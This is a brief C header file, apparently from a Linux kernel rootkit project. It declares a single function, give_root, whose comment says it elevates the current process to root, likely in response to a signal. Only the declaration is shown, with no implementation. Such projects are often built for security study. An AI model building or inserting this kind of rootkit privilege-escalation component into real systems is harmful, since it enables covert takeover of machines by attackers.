#ifndef _ROOTKIT_UTILS_H_
#define _ROOTKIT_UTILS_H_

#include <linux/types.h>


/**
 * Elevate the current process to root
 */
void give_root(pid_t i32_pid, int i32_sig);

#endif
